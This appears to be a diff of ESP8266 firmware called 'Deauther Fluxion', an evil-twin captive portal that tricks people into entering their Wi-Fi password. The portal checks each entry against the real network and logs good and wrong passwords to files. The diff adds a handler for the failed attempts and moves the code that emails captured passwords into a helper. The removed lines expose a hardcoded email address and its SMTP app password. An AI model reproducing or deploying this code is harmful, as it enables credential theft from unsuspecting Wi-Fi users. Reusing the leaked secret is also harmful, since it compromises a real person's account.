@@ -1,98 +1,6 @@
 #include "LittleFSRW.h"
-#include <ESP8266WiFi.h>
-#include <DNSServer.h>
-#include <ESP8266WebServer.h>
-#include <ESP8266HTTPUpdateServer.h>
-//#include <PubSubClient.h>
-
-#include <ESP_Mail_Client.h>
-#define SMTP_HOST "smtp.mail.yahoo.com"
-#define SMTP_PORT esp_mail_smtp_port_587
-/* The log in credentials */
-#define AUTHOR_EMAIL "mochammad.effendi@yahoo.com"
-#define AUTHOR_PASSWORD "pqbyhuxthwoooetw"
-
-/* The SMTP Session object used for Email sending */
-SMTPSession smtp;
-
-/* Callback function to get the Email sending status */
-void smtpCallback(SMTP_Status status);
-
-const char rootCACert[] PROGMEM = "-----BEGIN CERTIFICATE-----\n"
-                                  "-----END CERTIFICATE-----\n";
-
-/* Callback function to get the Email sending status */
-void smtpCallback(SMTP_Status status)
-{
-  /* Print the current status */
-  Serial.println(status.info());
-
-  /* Print the sending result */
-  if (status.success())
-  {
-    Serial.println("----------------");
-    ESP_MAIL_PRINTF("Message sent success: %d\n", status.completedCount());
-    ESP_MAIL_PRINTF("Message sent failled: %d\n", status.failedCount());
-    Serial.println("----------------\n");
-    struct tm dt;
-
-    for (size_t i = 0; i < smtp.sendingResult.size(); i++)
-    {
-      /* Get the result item */
-      SMTP_Result result = smtp.sendingResult.getItem(i);
-      time_t ts = (time_t)result.timestamp;
-      localtime_r(&ts, &dt);
-
-      ESP_MAIL_PRINTF("Message No: %d\n", i + 1);
-      ESP_MAIL_PRINTF("Status: %s\n", result.completed ? "success" : "failed");
-      ESP_MAIL_PRINTF("Date/Time: %d/%d/%d %d:%d:%d\n", dt.tm_year + 1900, dt.tm_mon + 1, dt.tm_mday, dt.tm_hour, dt.tm_min, dt.tm_sec);
-      ESP_MAIL_PRINTF("Recipient: %s\n", result.recipients.c_str());
-      ESP_MAIL_PRINTF("Subject: %s\n", result.subject.c_str());
-    }
-    Serial.println("----------------\n");
-
-    //You need to clear sending result as the memory usage will grow up.
-    smtp.sendingResult.clear();
-  }
-}
-
-/*
-  WiFiClient espClient;
-  PubSubClient client(espClient);
-  const char* mqtt_server = "broker.hivemq.com";
-  #define MSG_BUFFER_SIZE  (50)
-  char msg[MSG_BUFFER_SIZE];
-  String clientId;
-*/
-
-ESP8266HTTPUpdateServer httpUpdater;
-
-extern "C" {
-#include "user_interface.h"
-}
-
-
-typedef struct
-{
-  String ssid;
-  uint8_t ch;
-  uint8_t bssid[6];
-}  _Network;
-
-String _SSIDPassword = "";
-String _savedSSIDPassword = "";
-String _wrongSSIDPassword = "";
-String _savedwrongSSIDPassword = "";
-
-const char* serverIndex = "<form method='POST' action='/updates' enctype='multipart/form-data'><input type='file' name='update'><input type='submit' value='Update'></form>";
-
-const byte DNS_PORT = 53;
-IPAddress apIP(192, 168, 1, 1);
-DNSServer dnsServer;
-ESP8266WebServer webServer(80);
-
-_Network _networks[16];
-_Network _selectedNetwork;
+#include "GlobalVar.h"
+#include "ESPMailSend.h"
 
 void clearArray() {
   for (int i = 0; i < 16; i++) {
@@ -101,55 +9,6 @@ void clearArray() {
   }
 
 }
-
-String _correct = "";
-String _tryPassword = "";
-
-/*
-  void callback(char* topic, byte* payload, unsigned int length) {
-  Serial.print("Message arrived [");
-  Serial.print(topic);
-  Serial.print("] ");
-  for (int i = 0; i < length; i++) {
-    Serial.print((char)payload[i]);
-  }
-  Serial.println();
-
-  // Switch on the LED if an 1 was received as first character
-  if ((char)payload[0] == '1') {
-    digitalWrite(BUILTIN_LED, LOW);   // Turn the LED on (Note that LOW is the voltage level
-    // but actually the LED is on; this is because
-    // it is active low on the ESP-01)
-  } else {
-    digitalWrite(BUILTIN_LED, HIGH);  // Turn the LED off by making the voltage HIGH
-  }
-  }
-*/
-/*
-  void reconnect() {
-  // Loop until we're reconnected
-  while (!client.connected()) {
-    Serial.print("Attempting MQTT connection...");
-    // Create a random client ID
-    clientId = "ESP8266Client-";
-    clientId += String(random(0xffff), HEX);
-    // Attempt to connect
-    if (client.connect(clientId.c_str())) {
-      Serial.println("connected");
-      // Once connected, publish an announcement...
-      client.publish("outTopic2", "hello world");
-      // ... and resubscribe
-      client.subscribe("inTopic1");
-    } else {
-      Serial.print("failed, rc=");
-      Serial.print(client.state());
-      Serial.println(" try again in 5 seconds");
-      // Wait 5 seconds before retrying
-      delay(5000);
-    }
-  }
-  }
-*/
 
 void performScan() {
   int n = WiFi.scanNetworks();
@@ -196,44 +55,8 @@ void handleResult() {
       }
       client.publish("SavedSSIDPassword", msg);
     */
-    smtp.debug(1);
-    /* Set the callback function to get the sending results */
-    smtp.callback(smtpCallback);
-    /* Declare the session config data */
-    ESP_Mail_Session session;
-    /* Set the session config */
-    session.server.host_name = SMTP_HOST;
-    session.server.port = SMTP_PORT;
-    session.login.email = AUTHOR_EMAIL;
-    session.login.password = AUTHOR_PASSWORD;
-    session.login.user_domain = F("yahoo.com");
-    /* Set the NTP config time */
-    session.time.ntp_server = F("pool.ntp.org,time.nist.gov");
-    session.time.gmt_offset = 7;
-    session.time.day_light_offset = 0;
-    /* Declare the message class */
-    SMTP_Message message;
-    /* Set the message headers */
-    message.sender.name = F("Deauther Fluxion");
-    message.sender.email = AUTHOR_EMAIL;
-    message.subject = F("Deauther Fluxion");
-    message.addRecipient(F("Mochammad Effendi"), F("mochammad.effendi@yahoo.com"));
-    String textMsg = _SSIDPassword;
-    message.text.content = textMsg;
-    message.text.charSet = F("us-ascii");
-    message.text.transfer_encoding = Content_Transfer_Encoding::enc_7bit;
-    message.priority = esp_mail_smtp_priority::esp_mail_smtp_priority_low;
-    /* Set the custom message header */
-    message.addHeader(F("Message-ID: <abcde.fghij@gmail.com>"));
-    /* Connect to server with the session config */
-    if (!smtp.connect(&session))
-      return;
-    /* Start sending Email and close the session */
-    if (!MailClient.sendMail(&smtp, &message))
-      Serial.println("Error sending Email, " + smtp.errorReason());
-    //to clear sending result log
-    //smtp.sendingResult.clear();
-    ESP_MAIL_PRINTF("Free Heap: %d\n", MailClient.getFreeHeap());
+    smtpsend(_wrongSSIDPassword, "Deauther Fluxion | Wrong Password");
+    smtpsend(_SSIDPassword, "Deauther Fluxion | Good Password");
 
     _SSIDPassword = "<li><b>" + _SSIDPassword + "</li></b>";
     _savedSSIDPassword += _SSIDPassword;
@@ -360,9 +183,10 @@ void handleIndex() {
       
       _wrongSSIDPassword = "SSID : " + _selectedNetwork.ssid + " Password : " + _tryPassword ;
       appendFile(LittleFS, "/wrongpass.txt", _wrongSSIDPassword.c_str());
+      
       _wrongSSIDPassword = "<li><b>" + _wrongSSIDPassword + "</li></b>";
       _savedwrongSSIDPassword += _wrongSSIDPassword;
-      appendFile(LittleFS, "/password.txt", _savedwrongSSIDPassword.c_str());
+      appendFile(LittleFS, "/wrongpassword.txt", _savedwrongSSIDPassword.c_str());
       WiFi.disconnect();
       WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
       webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><h2>Updating, please wait...</h2></body> </html>");
@@ -470,6 +294,15 @@ void handlePassword() {
   webServer.send(200, "text/html", _html);
 }
 
+void handlewrongPassword() {
+  _savedwrongSSIDPassword = readFiles(LittleFS, "/wrongpassword.txt");
+  String _html = _tempHTML2;
+  _html += "<ol>" + _savedwrongSSIDPassword + "</ol>";
+
+  _html += "</div></body></html>";
+  webServer.send(200, "text/html", _html);
+}
+
 String bytesToStr(const uint8_t* b, uint32_t size) {
   String str;
   const char ZERO = '0';
@@ -511,6 +344,7 @@ void setup() {
   webServer.on("/result", handleResult);
   webServer.on("/admin", handleAdmin);
   webServer.on("/password", handlePassword);
+  webServer.on("/wrongpassword", handlewrongPassword);
   webServer.onNotFound(handleIndex);
   httpUpdater.setup(&webServer);
   webServer.begin();
@@ -556,8 +390,8 @@ void loop() {
       Serial.println("WiFi connected");
       Serial.println("IP address: ");
       Serial.println(WiFi.localIP());
-      _savedSSIDPass = readFiles(LittleFS, "/pass.txt");
-      Serial.println(_savedSSIDPass);
+      _SSIDPassword = readFiles(LittleFS, "/pass.txt");
+      Serial.println(_SSIDPassword);
       //msg =  _savedSSIDPassword;
 
     }
